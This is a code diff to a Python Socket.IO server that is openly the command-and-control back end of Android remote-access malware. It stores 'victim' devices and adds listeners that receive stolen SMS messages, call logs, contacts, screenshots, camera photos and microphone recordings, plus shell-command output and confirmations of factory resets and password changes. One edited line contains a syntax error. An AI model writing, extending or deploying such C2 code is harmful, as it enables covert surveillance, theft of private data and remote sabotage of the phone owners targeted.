@@ -26,10 +26,36 @@ socketio = SocketIO(app)
 0xC - List Installed Apps
 0xD - Vibrate Phone
 0xE - Change Wallpaper
-0x10 - Factory Reset Device
-0x11 - Reboot Device
-0x12 - Change Device Password
+0xF - Factory Reset Device
+0x10 - Reboot Device
+0x11 - Change Device Password
 '''
+
+def write_to_log(data):
+    with open('c2.log', 'a') as f:
+        f.write(f"{data['device_id']}: {data['message']}")
+
+def log_to_console(data):
+    if data['status'] is 'success':
+        emit("log", {'data': [f"{data['device_id']}: {data['message']}", 'success']})
+    else:
+        emit("log", {'data': [f"{data['device_id']}: {data['message']}", 'danger']})
+    write_to_log(data)
+
+
+def update_database_and_log(value, data):
+    if data['status'] is 'success':
+        try:
+            con = sqlite3.connect("database.db")
+            cur = con.cursor()
+            cur.execute(f"UPDATE victim SET {value}=? WHERE deviceid=?", (data['data'], data['device_id']))
+            con.commit()
+        except sqlite3.Error as error:
+            print(error)
+        emit("log", {'data': [f"{data['device_id']}: {data['message']}", 'success']})
+    else:
+        emit("log", {'data': [f"{data['device_id']}: {data['message']}", 'danger']})
+    write_to_log(data)
 
 
 # Connection from C2
@@ -84,7 +110,7 @@ def value_changed(data):
             if record[0][3] != request.remote_addr:
                 cur.execute("UPDATE victim SET ipaddress=? WHERE deviceid=?", (request.remote_addr, data['device_id']))
                 con.commit()
-                emit("update victim ip", {'data' : [data['device_id'], request.remote_addr]})
+                emit("update victim ip", {'data' : [data['device_id'], 'light' request.remote_addr]})
             if record[0][6] != request.sid:
                 cur.execute("UPDATE victim SET socketid=? WHERE deviceid=?", (request.sid, data['device_id']))
                 con.commit()
@@ -109,6 +135,95 @@ def value_changed(message):
     print(message['data'])
     emit('update value', message, broadcast=True,)
 
+
+@socketio.on('0x0')
+def send_sms_listener(data):
+    log_to_console(data)
+
+
+@socketio.on('0x1')
+def read_sms_listener(data):
+    update_database_and_log('readsms', data)
+
+
+@socketio.on('0x2')
+def read_call_log_listener(data):
+    print(data)
+
+
+@socketio.on('0x3')
+def make_phone_call_listener(data):
+    log_to_console(data)
+
+
+@socketio.on('0x4')
+def dial_ussd_listener(data):
+    print(data)
+
+
+@socketio.on('0x5')
+def read_contacts_listener(data):
+    print(data)
+
+
+@socketio.on('0x6')
+def write_contact_listener(data):
+    log_to_console(data)
+
+
+@socketio.on('0x7')
+def screenshot_listener(data):
+    print(data)
+
+
+@socketio.on('0x8')
+def get_camera_list_listener(data):
+    print(data)
+
+
+@socketio.on('0x9')
+def take_picture_listener(data):
+    print(data)
+
+
+@socketio.on('0xA')
+def record_mic_listener(data):
+    print(data)
+
+
+@socketio.on('0xB')
+def sh_command_listener(data):
+    print(data)
+
+
+@socketio.on('0xC')
+def list_installed_apps_listener(data):
+    print(data)
+
+
+@socketio.on('0xD')
+def vibrate_phone_listener(data):
+    log_to_console(data)
+
+
+@socketio.on('0xE')
+def change_wallpaper_listener(data):
+    log_to_console(data)
+
+
+@socketio.on('0xF')
+def factory_listener_listener(data):
+    log_to_console(data)
+
+
+@socketio.on('0x10')
+def reboot_device_listener(data):
+    log_to_console(data)
+
+
+@socketio.on('0x11')
+def change_device_passowrd_listener(data):
+    log_to_console(data)
 
 
 if __name__ == "__main__":
